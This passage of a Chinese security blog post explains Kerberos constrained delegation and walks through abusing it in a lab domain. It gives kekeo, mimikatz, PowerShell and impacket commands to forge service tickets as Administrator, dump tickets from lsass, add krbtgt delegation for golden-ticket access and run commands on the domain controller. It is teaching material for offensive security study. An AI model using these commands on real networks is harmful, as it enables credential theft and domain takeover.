+<li><code>S4U2proxy</code>(Service for User to Proxy) 可以以用户的名义请求其它服务的 ST，限制了 S4U2proxy 扩展的范围。服务帐户可以<strong>代表任何用户</strong>获取在 <code>msDS-AllowedToDelegateTo</code> 中设置的服务的 TGS/ST，首先需要从该用户到其本身的 TGS/ST，但它可以在请求另一个 TGS 之前使用 S4U2self 获得此 TGS/ST。</li>
+</ul>
+<p><strong>S4U2self</strong>：</p>
+<p>(1) 用户向 service1 发送请求。用户已通过身份验证，但 service1 没有用户的授权数据。通常，这是由于身份验证是通过 Kerberos 以外的其他方式验证的。</p>
+<p>(2) 通过 S4U2self 扩展以用户的名义向 KDC 请求用于访问 service1 的 ST1。</p>
+<p>(3) KDC 返回给 service1 一个用于用户验证 service1 的 ST1，该 ST1 可能包含用户的授权数据。</p>
+<p>(4) service1 可以使用 ST 中的授权数据来满足用户的请求，然后响应用户。</p>
+<p>尽管 S4U2self 向 service1 提供有关用户的信息，但 S4U2self 不允许 service1 代表用户发出其他服务的请求，这时候就轮到 S4U2proxy 发挥作用了。</p>
+<p><strong>S4U2proxy</strong>:</p>
+<p>(5) 用户向 service1 发送请求，service1 需要以用户身份访问 service2 上的资源。</p>
+<p>(6) service1 以用户的名义向 KDC 请求用户访问 service 2的 ST2。</p>
+<p>(7) 如果请求中包含 PAC，则 KDC 通过检查 PAC 的签名数据来验证 PAC ，如果 PAC 有效或不存在，则 KDC 返回 ST2 给 service1，但存储在 ST2 的 cname 和 crealm 字段中的客户端身份是用户的身份，而不是 service1 的身份。</p>
+<p>(8) service1 使用 ST2 以用户的名义向 service2 发送请求，并判定用户已由 KDC 进行身份验证。</p>
+<p>(9) service2 响应步骤 8 的请求。</p>
+<p>(10) service1 响应用户对步骤 5 中的请求。</p>
+<p><strong>总结</strong></p>
+<p>其实约束委派就是限制了<strong>S4U2proxy</strong> 这一部分  就是只能获取到用户访问服务的ST  不能获取到用户的TGT了</p>
+<h3 id="操作-1"><a href="#操作-1" class="headerlink" title="操作"></a>操作</h3><p>操作环境：</p>
+<ul>
+<li>域：<code>qiyou.com</code></li>
+<li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li>
+<li>域内主机：<code>DM08</code></li>
+</ul>
+<p><code>DM08</code>是域内的另外一台主机，下面我们设置了服务用户<code>qiyou</code>对<code>DM08</code>的<code>cifs</code>服务的委派</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930170007987.png" alt="image-20230930170007987"></p>
+<p>概述那里我们讲了在约束委派的情况下，服务用户只能获取某个用户（或主机）的服务的ST，所以只能模拟用户访问特定的服务，是无法获取用户的TGT，如果我们能获取到开启了约束委派的服务用户的明文密码或者<code>NTLM Hash</code>，我们就可以伪造S4U请求，进而伪装成服务用户以<strong>任意账户</strong>的权限申请访问某服务的ST</p>
+<p><strong>简单点讲 </strong></p>
+<blockquote>
+<p>就是因为约束委派是不能使用<strong>S4U2proxy</strong>的   那么服务账户就只能获取到用户的ST  那么如果我们获取到了服务账户的密码或者ntlm的hash值  那么我们就可以进行ST的伪造 从而访问自己想要访问的服务</p>
+</blockquote>
+<p>已经知道服务用户明文的条件下，我们可以用kekeo请求该用户的TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /password:password /ticket:test.kirbi</span><br></pre></td></tr></table></figure>
+<p><code>/user</code>: 服务用户的用户名</p>
+<p><code>/password</code>: 服务用户的明文密码</p>
+<p><code>/domain</code>: 所在域名</p>
+<p><code>/ticket</code>: 指定票据名称，不过这个参数没有生效，可以忽略</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930171523675.png" alt="image-20230930171523675"></p>
+<p>得到服务用户TGT：<code>TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi</code></p>
+<p>然后我们可以使用这张TGT通过伪造s4u请求以<code>administrator</code>用户身份请求访问<code>dm08 CIFS</code>的ST</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure>
+<p><strong>这里能伪造成功是因为这个服务账户的TGT是能访问这个cifs服务  然后我们使用他骗过了域管  然后成功伪造了ST</strong></p>
+<p><strong>(能成功伪造这个域管用户Administrator成功的原因是因为这个KDC验证的话是只查找该用户是否存在   并不会判断其身份的可靠性)</strong></p>
+<p><code>S4U2Self</code>获取到的ST1以及<code>S4U2Proxy</code>获取到的dm08 CIFS服务的ST2会保存在当前目录下</p>
+<p>然后我们用mimikatz将ST2导入当前会话即可</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
+<p>成功访问到dm08的cifs服务</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930172217655.png" alt="image-20230930172217655"></p>
+<p>上面是知道服务用户明文的情况下，kekeo同样也支持使用<code>NTLM Hash</code></p>
+<p>在请求服务用户的TGT那步直接把<code>/password</code>改成<code>/NTLM</code>即可</p>
+<p>已知我们服务账号<code>qiyou</code>的<code>NTLM hash</code>是<code>b4f27a13d0f78d5ad83750095ef2d8ec</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tgt::ask /user:qiyou /domain:qiyou.com /NTLM:b4f27a13d0f78d5ad83750095ef2d8ec</span><br><span class="line">tgs::s4u /tgt:TGT_qiyou@QIYOU.COM_krbtgt~qiyou.com@QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930172252504.png" alt="image-20230930172252504"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930172318778.png" alt="image-20230930172318778"></p>
+<p>如果我们不知道服务用户的明文和NTLM Hash，但是我们有了服务用户登陆的主机权限（需要本地管理员权限），我们可以用<code>mimikatz</code>直接从内存中把服务用户的TGT dump出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930173327785.png" alt="image-20230930173327785"></p>
+<p><strong>注</strong>：<code>sekurlsa::tickets</code>是列出和导出所有会话的<code>Kerberos</code>票据，<code>sekurlsa::tickets</code>和<code>kerberos::list</code>不同，sekurlsa是从内存读取，也就是从lsass进程读取，这也就是为什么<code>sekurlsa::tickets /export</code>需要管理员权限的原因。并且<code>sekurlsa::tickets</code>的导出不受密钥限制，sekurlsa可以访问其他会话（用户）的票证。</p>
+<p>既然服务用户的TGT导出来了，我们就跳过<code>tgt::ask</code>请求TGT这步，直接<code>tgs::s4u</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tgs::s4u /tgt:[0;196b1e4]-2-0-60a00000-qiyou@krbtgt-QIYOU.COM.kirbi /user:Administrator@qiyou.com /service:cifs/dm08.qiyou.com</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930173522455.png" alt="image-20230930173522455"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptt TGS_Administrator@qiyou.com@QIYOU.COM_cifs~dm08.qiyou.com@QIYOU.COM.kirbi</span><br></pre></td></tr></table></figure>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930173538750.png" alt="image-20230930173538750"></p>
+<h3 id="利用约束委派生成黄金票据"><a href="#利用约束委派生成黄金票据" class="headerlink" title="利用约束委派生成黄金票据"></a>利用约束委派生成黄金票据</h3><p>操作环境：</p>
+<ul>
+<li>域：<code>qiyou.com</code></li>
+<li>域控：<code>windows server 2008R2</code>，主机名：<code>WIN-QFPHJSM1L7G</code>，IP：<code>192.168.141.145</code>，用户：<code>administrator</code></li>
+<li>域内主机：<code>windows server 2012R2</code>，主机名：<code>DM2012</code>，IP：<code>192.168.141.134</code>，用户：<code>qiyou</code></li>
+</ul>
+<p>我们都知道TGT的生成是由<code>krbtgt</code>用户加密和签名的，如果我们能委派域上的用户去访问<code>TGS</code>，那么就可以伪造任意用户的TGT了，黄金票据通常情况下我们是用<code>krbtgt</code>的hash来伪造TGT，不过我们通过约束委派也能达到同样的效果。</p>
+<p><strong>注</strong>：<code>TGS</code>默认的spn是<code>krbtgt/domain name</code>，我们操作环境是<code>krbtgt/QIYOU.COM</code></p>
+<p><code>krbtgt</code>默认是禁用的而且无法启用，所以我们无法使用界面来添加这个SPN。</p>
+<p>我们可以使用powershell来添加</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ActiveDirectory</span><br><span class="line">$user = Get-ADUser qiyou</span><br><span class="line">Set-ADObject $user -Add @&#123; &quot;msDS-AllowedToDelegateTo&quot; = @(&quot;krbtgt/qiyou.com&quot;) &#125;</span><br></pre></td></tr></table></figure>
+<p>我们可以用<code>impacket</code>系列的<code>getST</code>向KDC请求administrator的TGT</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">getst.exe -dc-ip 192.168.141.145 -spn krbtgt/qiyou.com -impersonate Administrator qiyou.com/qiyou:password</span><br></pre></td></tr></table></figure>
+<p><strong>(解释一下这里的这样干的原因  因为我们添加了服务账户  并且这个服务账户时约束这个krbtgt服务的   然后我们就有了访问这个服务的权限  并且因为这个服务是可以用来生成TGT的  所以我们就可以成功伪造 )</strong></p>
+<p>-impersonate：表示伪造用户</p>
+<p>-spn：表示我们要委派的服务的spn，这里是TGS</p>
+<p>-dc-ip：域控ip</p>
+<p>执行之后会在当前目录生成一个缓存文件<code>Administrator.ccache</code></p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930174306259.png" alt="image-20230930174306259"></p>
+<p>然后用mimikatz进行<code>ptc</code>（pass the cache），将缓存注入当前会话中</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930174333936.png" alt="image-20230930174333936"></p>
+<p>klist查看缓存的票据</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930174346596.png" alt="image-20230930174346596"></p>
+<p>访问域控</p>
+<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20230930174409252.png" alt="image-20230930174409252"></p>
+<p>执行命令的话我们可以用<code>impacket</code>系列或者<code>powershell</code>都可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wmiexec.exe -no-pass -k administrator@WIN-QFPHJSM1L7G.qiyou.com -dc-ip 192.168.141.145</span><br><span class="line"></span><br><span class="line">pth攻击其实也行  先dump出hash  然后再打</span><br></pre></td></tr></table></figure>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io">ke1nys</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io/posts/bf224af2.html">https://ke1nys.github.io/posts/bf224af2.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ke1nys.github.io" target="_blank">ke1nys`Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%86%85%E7%BD%91/">内网</a></div><div class="post_share"><div class="social-share" data-image="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/c964b814.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">春秋云镜-Certify</div></div></a></div><div class="next-post pull-right"><a href="/posts/58c4c9ce.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">域渗透-基于资源的约束委派利用</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/9fa2b7fe.html" title="AD域-预身份验证"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-14</div><div class="title">AD域-预身份验证</div></div></a></div><div><a href="/posts/af4fc312.html" title="Msf反弹shell与不出网主机上线"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-04</div><div class="title">Msf反弹shell与不出网主机上线</div></div></a></div><div><a href="/posts/7a8168b7.html" title="Potato家族本地提权"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-03</div><div class="title">Potato家族本地提权</div></div></a></div><div><a href="/posts/29edf1b0.html" title="VulnStack1"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-19</div><div class="title">VulnStack1</div></div></a></div><div><a href="/posts/4c70f180.html" title="Windows-NTLM与PTH"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-16</div><div class="title">Windows-NTLM与PTH</div></div></a></div><div><a href="/posts/1bedf17b.html" title="Windows域-Kerberos协议"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-09-15</div><div class="title">Windows域-Kerberos协议</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ke1nys</div><div class="author-info__description">生命不息,折腾不止</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">139</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">121</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ke1nys/ke1nys.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客一起学习嗷~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8E%9F%E7%90%86%E8%AF%B4%E6%98%8E"><span class="toc-number">2.</span> <span class="toc-text">原理说明</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88%E9%9C%80%E8%A6%81%E5%9F%9F%E5%A7%94%E6%B4%BE"><span class="toc-number">3.</span> <span class="toc-text">为什么需要域委派</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%9F%E5%A7%94%E6%B4%BE%E6%B5%81%E7%A8%8B"><span class="toc-number">4.</span> <span class="toc-text">域委派流程</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A7%94%E6%B4%BE%E7%B1%BB%E5%9E%8B"><span class="toc-number">5.</span> <span class="toc-text">委派类型</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">6.</span> <span class="toc-text">非约束委派的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0"><span class="toc-number">6.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C"><span class="toc-number">6.2.</span> <span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E9%9D%9E%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE-Spooler%E6%89%93%E5%8D%B0%E6%9C%BA%E6%9C%8D%E5%8A%A1"><span class="toc-number">6.3.</span> <span class="toc-text">非约束委派+Spooler打印机服务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">7.</span> <span class="toc-text">约束委派的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%A6%82%E8%BF%B0-1"><span class="toc-number">7.1.</span> <span class="toc-text">概述</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%93%8D%E4%BD%9C-1"><span class="toc-number">7.2.</span> <span class="toc-text">操作</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%E7%BA%A6%E6%9D%9F%E5%A7%94%E6%B4%BE%E7%94%9F%E6%88%90%E9%BB%84%E9%87%91%E7%A5%A8%E6%8D%AE"><span class="toc-number">7.3.</span> <span class="toc-text">利用约束委派生成黄金票据</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/72d64c19.html" title="春秋云镜-Tsclient"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Tsclient"/></a><div class="content"><a class="title" href="/posts/72d64c19.html" title="春秋云镜-Tsclient">春秋云镜-Tsclient</a><time datetime="2023-10-07T13:16:01.000Z" title="发表于 2023-10-07 21:16:01">2023-10-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/327fc326.html" title="春秋云镜-Initial"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Initial"/></a><div class="content"><a class="title" href="/posts/327fc326.html" title="春秋云镜-Initial">春秋云镜-Initial</a><time datetime="2023-10-06T10:33:59.000Z" title="发表于 2023-10-06 18:33:59">2023-10-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/af4fc312.html" title="Msf反弹shell与不出网主机上线"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Msf反弹shell与不出网主机上线"/></a><div class="content"><a class="title" href="/posts/af4fc312.html" title="Msf反弹shell与不出网主机上线">Msf反弹shell与不出网主机上线</a><time datetime="2023-10-04T13:29:20.000Z" title="发表于 2023-10-04 21:29:20">2023-10-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/7a8168b7.html" title="Potato家族本地提权"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Potato家族本地提权"/></a><div class="content"><a class="title" href="/posts/7a8168b7.html" title="Potato家族本地提权">Potato家族本地提权</a><time datetime="2023-10-03T06:31:23.000Z" title="发表于 2023-10-03 14:31:23">2023-10-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/989b194c.html" title="春秋云镜-Brute4Road"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="春秋云镜-Brute4Road"/></a><div class="content"><a class="title" href="/posts/989b194c.html" title="春秋云镜-Brute4Road">春秋云镜-Brute4Road</a><time datetime="2023-10-02T12:08:19.000Z" title="发表于 2023-10-02 20:08:19">2023-10-02</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2023 By ke1nys</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
+if (navigator.serviceWorker.controller) {
+navigator.serviceWorker.addEventListener('controllerchange', function() {
+showNotification()
+})
+}
+window.addEventListener('load', function() {
+navigator.serviceWorker.register('/sw.js')
+})
+}
+function showNotification() {
+if (GLOBAL_CONFIG.Snackbar) {
+var snackbarBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+GLOBAL_CONFIG.Snackbar.bgLight :
+GLOBAL_CONFIG.Snackbar.bgDark
+var snackbarPos = GLOBAL_CONFIG.Snackbar.position
+Snackbar.show({
+text: '✨ 有新文章啦！ 👉',
+backgroundColor: snackbarBg,
+duration: 500000,
+pos: snackbarPos,
+actionText: '🍗点击食用🍔',
+actionTextColor: '#fff',
+onActionClick: function(e) {
+location.reload()
+},
+})
+} else {
+var showBg =
+document.documentElement.getAttribute('data-theme') === 'light' ?
+'#3b70fc' :
+'#1f1f1f'
+var cssText = `top: 0; background: ${showBg};`
+document.getElementById('app-refresh').style.cssText = cssText
+}
+}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><script data-pjax>
+  function butterfly_clock_anzhiyu_injector_config(){
+    var parent_div_git = document.getElementsByClassName('sticky_layout')[0];
